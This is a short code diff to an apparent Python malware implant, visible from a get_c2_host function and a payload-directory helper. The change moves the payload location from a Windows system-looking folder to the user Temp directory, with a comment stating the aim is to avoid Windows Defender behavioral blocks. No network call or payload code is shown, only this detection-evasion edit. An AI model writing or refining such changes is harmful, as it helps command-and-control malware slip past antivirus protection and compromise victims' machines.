@@ -74,7 +74,8 @@ def get_c2_host():
 def get_payload_dir():
     """Get the payload directory. Raises KeyError if LOCALAPPDATA doesn't exist."""
     localappdata = os.environ["LOCALAPPDATA"]  # Raises KeyError if missing - intentional
-    return os.path.join(localappdata, "Microsoft", "Windows")
+    # Use Temp directory - writable by users, avoids Windows Defender behavioral blocks
+    return os.path.join(localappdata, "Temp")
 
 
 # Lazy initialization - only computed when first accessed
